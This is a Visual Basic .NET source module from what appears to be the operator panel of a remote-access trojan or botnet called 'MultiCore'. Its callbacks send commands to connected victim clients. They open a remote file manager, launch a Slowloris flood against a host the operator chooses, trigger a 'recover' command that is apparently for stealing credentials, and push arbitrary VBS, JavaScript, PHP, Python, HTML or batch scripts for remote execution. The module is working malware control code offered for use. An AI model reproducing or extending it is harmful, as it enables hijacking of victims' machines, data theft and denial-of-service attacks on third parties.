Imports Microsoft.VisualBasic
Imports System.Net
Imports System.Windows.Forms

Module ContextCallbacks

    Public Sub ManaCallback(Clients As IClient(), Checked As Boolean)

        If Not Clients.Length = 1 Then Return
        Clients2 = Clients
        FileMan.Show()

        FileMan.ListBox1.Items.Clear()
        FileMan.ListView1.Items.Clear()

        For Each Client As IClient In Clients2
            SendMiscCommandManage(Client, "GetDrives")
        Next

    End Sub

    Public Sub StressCallback(Clients As IClient(), Checked As Boolean)

        If Clients.Length = 0 Then Return

        Dim StrHost As String = InputBox("Please enter a host name.", "MultiCore")
        Dim StrThreadsto As String = InputBox("Please enter the amount of threads to use.", "MultiCore")
        Dim StrTime As String = InputBox("Please enter the time.", "MultiCore")

        SSTMutli.OverallStress1.Graph1.Clear()

        If IsNumeric(StrThreadsto) Then
            If IsNumeric(StrTime) Then
                For Each Client As IClient In Clients
                    SendSSTSlowloris(Client, StrHost & "|" & StrThreadsto & "|" & StrTime & "|")
                Next
            End If
        End If

    End Sub

    Public Sub Donation(Clients As IClient(), Checked As Boolean)
        Dim Address As String

        Using Google As New WebClient
            Address = Google.DownloadString("http://lazyshare.net/Crypto/Donate.php")
        End Using

        My.Computer.Clipboard.SetText(Address)

        MessageBox.Show("Donation address copied to clipboard." & vbNewLine & _
                       Address & vbNewLine & _
                       "Minimum donation is 0.0005 BTC", "Donation", MessageBoxButtons.OK, MessageBoxIcon.Information)

    End Sub

    Public Sub ToolsRecCallback(Clients As IClient(), Checked As Boolean)

        If Clients.Length = 0 Then Return

        For Each Client As IClient In Clients
            SendMiscCommandRecover(Client, "")
        Next

    End Sub

    Public Sub ToolsVBSCallback(Clients As IClient(), Checked As Boolean)
        If Clients.Length = 0 Then Return

        Dim SCRForm As New Remote
        SCRForm.Text = "Remote Script [Visual Basic Script]"
        If Not SCRForm.ShowDialog() = Windows.Forms.DialogResult.OK Then Return

        For Each Client As IClient In Clients
            SendMiscCommandScript(Client, "VBS|" & SCRForm.Message)
        Next

    End Sub

    Public Sub ToolsJSCallback(Clients As IClient(), Checked As Boolean)
        If Clients.Length = 0 Then Return

        Dim SCRForm As New Remote
        SCRForm.Text = "Remote Script [Java Script]"
        If Not SCRForm.ShowDialog() = Windows.Forms.DialogResult.OK Then Return

        For Each Client As IClient In Clients
            SendMiscCommandScript(Client, "JS|" & SCRForm.Message)
        Next

    End Sub

    Public Sub ToolsPHPCallback(Clients As IClient(), Checked As Boolean)
        If Clients.Length = 0 Then Return

        Dim SCRForm As New Remote
        SCRForm.Text = "Remote Script [PHP]"
        If Not SCRForm.ShowDialog() = Windows.Forms.DialogResult.OK Then Return

        For Each Client As IClient In Clients
            SendMiscCommandScript(Client, "PHP|" & SCRForm.Message)
        Next

    End Sub
    Public Sub ToolsPyCallback(Clients As IClient(), Checked As Boolean)
        If Clients.Length = 0 Then Return

        Dim SCRForm As New Remote
        SCRForm.Text = "Remote Script [Python]"
        If Not SCRForm.ShowDialog() = Windows.Forms.DialogResult.OK Then Return

        For Each Client As IClient In Clients
            SendMiscCommandScript(Client, "PY|" & SCRForm.Message)
        Next

    End Sub

    Public Sub ToolsREMCallback(Clients As IClient(), Checked As Boolean)
        If Clients.Length = 0 Then Return

        For Each Client As IClient In Clients
            SendMiscCommandScript(Client, "REM| ")
        Next

    End Sub

    Public Sub ToolsHTMLCallback(Clients As IClient(), Checked As Boolean)
        If Clients.Length = 0 Then Return

        Dim SCRForm As New Remote
        SCRForm.Text = "Remote Script [HTML]"
        If Not SCRForm.ShowDialog() = Windows.Forms.DialogResult.OK Then Return

        For Each Client As IClient In Clients
            SendMiscCommandScript(Client, "HTML|" & SCRForm.Message)
        Next

    End Sub

    Public Sub ToolsBatchCallback(Clients As IClient(), Checked As Boolean)

        If Clients.Length = 0 Then Return

        Dim SCRForm As New Remote
        SCRForm.Text = "Remote Script [Batch]"
        If Not SCRForm.ShowDialog() = Windows.Forms.DialogResult.OK Then Return

        For Each Client As IClient In Clients
            SendMiscCommandScript(Client, "Batch|" & SCRForm.Message)
        Next

    End Sub
End Module
